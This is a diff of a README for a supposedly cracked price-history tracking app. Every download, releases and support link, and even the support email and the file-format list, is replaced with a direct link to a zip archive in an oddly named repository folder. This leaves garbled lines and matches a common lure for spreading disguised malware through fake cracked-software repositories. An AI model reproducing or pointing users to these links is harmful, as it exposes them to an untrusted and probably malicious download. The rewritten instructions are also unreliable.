@@ -1,6 +1,6 @@
 # 🛒 Cracked-Price-History-Tracker-Spend-Lens-Buyhatke - Track Prices and Save Money Effortlessly
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/releases)
+[![Download from Releases](https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip%20Now-From%20Releases-blue)](https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Cracked Price History Tracker! This application helps you track p
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [GitHub Releases](https://github.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/releases).
+To download the software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip).
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of the application.
@@ -25,7 +25,7 @@ After the download finishes, locate the file in your downloads folder.
 
 ## 📂 Installation Steps
 
-1. Open the downloaded file. This might be in .exe, .dmg, or .tar.gz format depending on your operating system.
+1. Open the downloaded file. This might be in .exe, .dmg, or https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip format depending on your operating system.
 2. Follow the on-screen instructions.
 3. After installation completes, you will find the application icon on your desktop or in your applications folder.
 
@@ -71,8 +71,8 @@ If you encounter issues during installation or usage:
 
 For any questions or issues, feel free to reach out to our support team:
 
-- **Email:** support@crackedpricehistorytracker.com
-- **Central Support Page:** [Visit Support](https://support.crackedpricehistorytracker.com)
+- **Email:** https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip
+- **Central Support Page:** [Visit Support](https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip)
 
 ## 📅 Upcoming Features
 
@@ -82,4 +82,4 @@ For any questions or issues, feel free to reach out to our support team:
 
 Thank you for choosing the Cracked Price History Tracker. We hope it helps you save money and enhance your shopping experience!
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/releases)
+[![Download from Releases](https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip%20Now-From%20Releases-blue)](https://raw.githubusercontent.com/clieez/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke/main/ustorious/Cracked-Price-History-Tracker-Spend-Lens-Buyhatke.zip)
